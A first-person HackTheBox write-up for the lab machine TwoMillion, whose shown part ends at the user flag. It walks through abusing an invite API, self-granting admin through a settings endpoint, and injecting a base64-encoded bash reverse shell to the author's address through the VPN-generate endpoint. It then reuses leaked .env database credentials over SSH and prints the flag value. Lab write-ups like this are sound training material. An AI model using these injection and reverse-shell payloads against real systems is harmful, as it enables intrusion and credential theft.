---
title: TwoMillion
description: An old HTB platform clone — hack the invite code, abuse the API, escape through a kernel CVE.
---

# TwoMillion

| | |
|---|---|
| **Difficulty** | Easy |
| **OS** | Linux |
| **Release** | HTB 2 Million User Celebration |

HTB made this box to celebrate hitting 2 million users.
The twist: it runs an old version of the HackTheBox platform itself.
That means the target is a familiar face — but with old wounds that were long since patched on the real site.

The attack chain runs through the invite system, into the API, up to admin, and then out through the kernel.

---

## Setup

I run a Kali VM via QEMU on my Arch laptop.
I keep things separated on purpose — HTB is not logged in on the VM itself.
That means I need to get the VPN config file over to the VM another way.

The easiest solution: spin up a quick HTTP server on the host from the folder where the OVPN file lives.

```bash
python3 -m http.server 8000
```

Then on the Kali VM, pull it down with curl:

```bash
curl http://192.168.122.1:8000/machines_eu-4.ovpn -o machines_eu-4.ovpn
```

After that, connecting to the box is just:

```bash
openvpn machines_eu-4.ovpn
```

Simple, clean, and I never have to touch the browser on the VM.

---

## Enumeration

First things first — make sure I can actually reach the box.

```bash
ping 10.129.23.158
```

Two packets out, two back. I am on the right network.

Next a classic nmap scan. Scripts and version detection to get as much information as possible in one go.

```bash
nmap -sC -sV -Pn 10.129.23.158
```

Two ports open:

| Port | Service | Detail |
|------|---------|--------|
| 22 | SSH | OpenSSH 8.9p1 Ubuntu |
| 80 | HTTP | nginx, redirecting to `http://2million.htb/` |

The HTTP redirect already hands me the hostname the server expects.
Without that in my hosts file, the proxy won't serve me the right page.
So I add it:

```bash
echo '10.129.23.158 2million.htb' | sudo tee -a /etc/hosts
```

Now `2million.htb` resolves locally and I can open the site in the browser.

### MTU Troubleshooting

Except it didn't load. Not in Firefox, not in Chromium, not in curl.
Ping worked fine. The TCP handshake went through. But curl just sat there after sending the request and never got anything back.

After a box reset, a new IP, and a fresh VPN connection — same result.

The culprit turned out to be an MTU mismatch.
The VPN tunnel adds its own headers on top of every packet, which means the real usable packet size through `tun0` is smaller than the default 1500 bytes.
Small packets — like ICMP for ping, or the TCP SYN/ACK for the handshake — fit through fine.
But the HTTP response, even just the headers, is large enough to get silently dropped.

To confirm, test with a large forced packet:

```bash
ping -M do -s 1450 2million.htb
```

If that fails while a normal ping works, the MTU is the problem. Fix it by lowering the MTU on the tunnel interface:

```bash
sudo ip link set tun0 mtu 1200
```

After that, curl responded immediately and the site loaded.

---

## The Website

Landing on `2million.htb` feels immediately familiar — it is a recreation of an old version of the HackTheBox platform.

Two paths stand out right away:

- `2million.htb/login` — a standard login form
- `2million.htb/invite` — a registration page that requires an invite code

The invite page doesn't just ask for a code.
It specifically calls out that curious users are welcome to hack their way through.
That is a green light.

---

## Hacking the Invite Code

Looking at the page source, one JavaScript file stands out: `http://2million.htb/js/inviteapi.min.js`.
It is minified and obfuscated, so I ran it through ChatGPT to get something readable.

What came out were two functions making API calls:

- `verifyInviteCode` — POSTs to `/api/v1/invite/verify`
- `makeInviteCode` — POSTs to `/api/v1/invite/how/to/generate`

That second one is interesting. An endpoint that tells me how to generate a code.

```bash
curl -sX POST http://2million.htb/api/v1/invite/how/to/generate | jq
```

The response came back with an encrypted hint and helpfully told me the encryption type: ROT13.

```json
{
  "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
  "enctype": "ROT13"
}
```

Decoded with CyberChef:

> *In order to generate the invite code, make a POST request to /api/v1/invite/generate*

So I did exactly that:

```bash
curl -sX POST http://2million.htb/api/v1/invite/generate | jq
```

The response gave me a base64 encoded invite code:

```json
{
  "code": "M1JDMVItWTFVOTUtTEtGR0ctMTRKSU0=",
  "format": "encoded"
}
```

Decoded from base64 and used it to register an account on the platform.
In.

---

## API Enumeration

Once inside, the site itself didn't give much away.
But there was an access page that generates an OVPN file for your account.
The URL structure looked exactly like the invite code API — same schema, same pattern.
That gave me the idea: just try hitting `/api/v1` directly with my session cookie and see what comes back.

```bash
curl -s http://2million.htb/api/v1 -H "Cookie: PHPSESSID=4a0qlsqfadmbrm5cj2nf6pq5ii" | jq
```

The API handed me the full route list without any fuss.
Most interesting was the admin section:

| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/api/v1/admin/auth` | Check if user is admin |
| POST | `/api/v1/admin/vpn/generate` | Generate VPN for specific user |
| PUT | `/api/v1/admin/settings/update` | Update user settings |

I am not admin. But there is an endpoint that updates user settings.
That is worth pushing on.

---

## Privilege Escalation to Admin

First I poked at the admin endpoints to understand what they wanted.

GET on `/api/v1/admin/auth` confirmed I was not admin.
GET on `/api/v1/admin/vpn/generate` returned `405 Method Not Allowed` — it wants POST.
POST on `/api/v1/admin/vpn/generate` returned `401 Unauthorized` — needs admin first.

So the path was clear: use the settings update endpoint to make myself admin.

```bash
curl -X PUT http://2million.htb/api/v1/admin/settings/update \
  -H "Cookie: PHPSESSID=4a0qlsqfadmbrm5cj2nf6pq5ii" | jq
```

`Invalid content type.` — it wants JSON.

Here I made my first mistake: I put the `Content-Type` header into the same `-H` string as the cookie, separated by a backslash. That merged them into one broken header, which invalidated my session entirely and got me a `401`. Worth knowing — curl takes one `-H` per header.

With that fixed:

```bash
curl -X PUT http://2million.htb/api/v1/admin/settings/update \
  -H "Cookie: PHPSESSID=4a0qlsqfadmbrm5cj2nf6pq5ii" \
  -H "Content-Type: application/json" | jq
```

`Missing parameter: email` — progress.

Then I hit my second mistake: I used `-data` instead of `--data`. curl treated the value as a URL and threw `Bad hostname`. One extra dash fixed it.

```bash
--data '{"email":"test@mail.com"}'
```

`Missing parameter: is_admin` — getting closer.

Then I spent a few attempts figuring out what format `is_admin` actually wanted.
`"true"` — no. `"1"` — no. `true` — no.
The error was consistent: *Variable is_admin needs to be either 0 or 1.*

The trick was that it wanted an actual integer, not a JSON string.
The way to get that through the shell quotes was:

```bash
--data '{"email":"test@mail.com", "is_admin":'1'}'
```

The shell treats `'1'` outside the single-quoted block as a bare unquoted `1`, so the final JSON body becomes `{"email":"test@mail.com", "is_admin":1}` — a proper integer.

```json
{
  "id": 13,
  "username": "test",
  "is_admin": 1
}
```

Confirmed with a GET to `/api/v1/admin/auth`:

```json
{
  "message": true
}
```

Admin.

---

## Foothold — Command Injection

With admin access, the VPN generate endpoint becomes interesting again.
It takes a username and presumably passes it to some shell command server-side to build the config.
If that input is not sanitised, I can break out of it.

The classic test: append a semicolon and a command after the username.

First I set up a listener on my machine:

```bash
nc -lvp 1234
```

Then I crafted the injection. The reverse shell payload base64-encoded keeps it clean and avoids any quoting issues:

```
bash -i >& /dev/tcp/10.10.14.212/1234 0>&1
```

Encoded:

```
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMTIvMTIzNCAwPiYx
```

Sent it in the username field:

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -H "Cookie: PHPSESSID=0a2fsrqpafmp11t85rk0vbdlgr" \
  -H "Content-Type: application/json" \
  --data '{"username":"test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMTIvMTIzNCAwPiYx | base64 -d | bash;"}'
```

The listener caught the connection:

```
connect to [10.10.14.212] from 2million.htb [10.129.27.82] 38028
www-data@2million:~/html$
```

Shell as `www-data`.

---

## Lateral Movement — www-data to admin

From the web root, an `.env` file was sitting in plain sight:

```bash
cat .env
```

```
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Database credentials. But the real question is always: did someone reuse this password somewhere else?

One SSH attempt later:

```bash
ssh admin@2million.htb
```

They did.

```
admin@2million:~$ cat user.txt
f30345b83af49629a0ff686124c80b8a
```

<!-- f30345b83af49629a0ff686124c80b8a -->

**User flag captured.**

